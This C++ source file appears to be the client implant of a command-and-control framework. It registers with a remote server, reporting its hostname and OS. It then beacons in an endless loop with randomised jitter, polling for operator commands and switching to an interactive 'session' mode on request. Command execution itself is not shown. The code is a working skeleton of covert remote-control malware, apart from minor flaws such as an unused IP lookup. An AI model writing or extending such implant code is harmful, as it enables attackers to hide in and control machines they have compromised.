#include <iostream>
#include <string>
#include <vector>
#include <tuple>
#include <stdexcept>
#include <curl/curl.h>
#include <json/json.h>
#include <cstdlib> 

#ifdef __unix__
#define OS "Linux"
#include "../Linux/generic.h"
#include <thread>
#include <chrono>
#endif

#ifdef WIN32
#include <windows.h>
#define OS "Windows"
#include "../Windows/generic.h"
#endif

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append((char*)contents, newLength);
    } catch(std::bad_alloc &e) {
        // Handle memory problem
        return 0;
    }
    return newLength;
}

std::tuple<int, std::string, std::string> getRequest(const std::string& url) {
    CURL* curl;
    CURLcode res;
    long response_code;
    std::string response_body;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            throw std::runtime_error("curl_easy_perform() failed: " + std::string(curl_easy_strerror(res)));
        }
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
    return std::make_tuple(response_code, response_body, url);
}

std::tuple<int, std::string> postRequest(const std::string& url, const std::string& jsonData) {
    CURL* curl;
    CURLcode res;
    long response_code;
    std::string response_body;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            throw std::runtime_error("curl_easy_perform() failed: " + std::string(curl_easy_strerror(res)));
        }
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
    curl_global_cleanup();
    return std::make_tuple(response_code, response_body);
}


std::tuple<int, std::string, int> httpConnection(const std::string& address) {
    std::string hostname = "client";
    std::vector<std::string> ipAddresses = getIPAddresses();

    std::string url = "http://" + address + ":8080/connection?name=" + hostname + "&os=" + OS + "&address=127.0.0.1";
    std::cout << "Request URL: " << url << std::endl;

    auto [response_code, response_body, response_url] = getRequest(url);

    try {
        if (response_code == 200) {
            Json::Value data;
            Json::CharReaderBuilder readerBuilder;
            std::string errs;

            std::istringstream s(response_body);
            if (!Json::parseFromStream(readerBuilder, s, &data, &errs)) {
                throw std::runtime_error("Failed to parse JSON: " + errs);
            }
            if (data.isMember("timer") && data.isMember("uuid") && data.isMember("jitter")) {
                int timer = std::stoi(data["timer"].asString());
                std::string ID = data["uuid"].asString();
                int jitter = std::stoi(data["jitter"].asString());
                return std::make_tuple(timer, ID, jitter);
            } else {
                throw std::runtime_error("Invalid JSON response: " + response_body);
            }
        } else {
            throw std::runtime_error("Failed to connect to server: " + std::to_string(response_code) + " " + response_body);
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
        throw;
    }
}

void beacon(const std::string& address, const std::string& ID, int jitter, int timer) {
    while (true) {
        std::string url = "http://" + address + "/beacon?id=" + ID;
        std::cout << "Request URL: " << url << std::endl;
        auto [response_code, response_body, response_url] = getRequest(url);
        try {
            if (response_code == 200) {
                Json::Value data;
                Json::CharReaderBuilder readerBuilder;
                std::string errs;

                std::istringstream s(response_body);
                if (!Json::parseFromStream(readerBuilder, s, &data, &errs)) {
                    throw std::runtime_error("Failed to parse JSON: " + errs);
                }

                if (data.isMember("command")) {
                    std::string command = data["command"].asString();
                    std::string cid = data["command_uuid"].asString();

                    if (command == "session") {
                        return;
                    }
                }

                if (data.isMember("timer")) {
                    int newTimer = std::stoi(data["timer"].asString());
                    if (newTimer > 0) {
                        timer = newTimer;
                    } else {
                        std::cerr << "Invalid timer value received: " << newTimer << std::endl;
                    }
                }

                int sleepTime = timer + rand() % (2 * jitter + 1) - jitter;

                #ifdef _WIN32
                    Sleep(sleepTime * 1000);
                #else
                    std::this_thread::sleep_for(std::chrono::seconds(sleepTime));
                #endif
            }
        } catch (const std::exception& e) {
            std::cerr << "Exception: " << e.what() << std::endl;
        }
    }
}